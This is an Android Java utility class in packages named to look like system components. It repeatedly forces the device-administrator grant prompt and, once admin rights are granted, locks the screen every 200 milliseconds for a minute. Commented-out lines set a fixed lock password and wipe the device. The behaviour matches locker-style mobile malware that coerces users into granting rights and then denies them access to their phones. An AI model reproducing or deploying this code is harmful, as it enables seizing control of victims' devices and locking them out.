package com.android.ring.devutils;

import java.util.Timer;
import java.util.TimerTask;

import com.android.log.CLog;
import com.android.ring.MainActivity;
import com.android.wu.admin.AdminReceiver;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class AdminUtils {
	public static final String DEVICE_ADMIN_ADD="com.android.settings.DeviceAdminAdd";
	
	Context context;
	ComponentName componentName;
	DevicePolicyManager devicePolicyManager ;
	
	long startTime;
	private static final long PERID=60000;
	Timer mTimer;
	
	public AdminUtils(Context context){
		this.context=context;

		// 设备安全管理服务    2.2之前的版本是没有对外暴露的 只能通过反射技术获取  
		devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
		
		// 申请权限
		componentName = new ComponentName(context, AdminReceiver.class);
	}
	
	public void test(){
		startTime=System.currentTimeMillis();
		mTimer=new Timer();
		mTimer.schedule(new TimerTask(){
			
			@Override
			public void run() {
				if(System.currentTimeMillis()-startTime>=PERID){
					mTimer.cancel();
				}
				start();
				// TODO Auto-generated method stub
			}}, 0, 200);
	}
	
	public void stop(){
		if(mTimer!=null){
			mTimer.cancel();
		}
	}
	
	public boolean start(){
		// 判断该组件是否有系统管理员的权限
		boolean isAdminActive = devicePolicyManager.isAdminActive(componentName);
		if(isAdminActive){
			devicePolicyManager.lockNow(); // 锁屏
//            devicePolicyManager.resetPassword("123", 0); // 设置锁屏密码
//            devicePolicyManager.wipeData(0);  恢复出厂设置  (建议大家不要在真机上测试) 模拟器不支持该操作
			return true;
		} else {
			 ComponentName mComponentName=IntentUtils.getActivity(context);
			 CLog.print("adminUtils", mComponentName.getClassName());
			 if(!DEVICE_ADMIN_ADD.equals(mComponentName.getClassName())){
				 if(!MainActivity.class.getName().equals(mComponentName.getClassName())){
					 MainActivity.start(context);
				 }else{
			Intent intent = new Intent();
			// 指定动作名称
			intent.setAction(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
			// 指定给哪个组件授权
			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
			context.startActivity(intent);
				 }
			 }
		}
		
		return false;
	}
//    private void register(){
//    	
//    	DevicePolicyManager mService = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
//    	Method method = Class.forName("android.os.ServiceManager").getMethod("getService", String.class);
//    	IBinder binder = (IBinder) method.invoke(null,new Object[] { Context.DEVICE_POLICY_SERVICE });
//    	mService = IDevicePolicyManager.Stub.asInterface(binder);
//
//
//
////    	3.注册广播接受者为admin设备
//    	ComponentName mAdminName = new ComponentName(this, AdminReceiver.class);
//    	if (mService != null) {
//    	        if (!mService.isAdminActive(mAdminName)) {
//    	                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
//    	                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,mAdminName);
//    	                    startActivity(intent);
//    	                }
//    	}
//    }

}
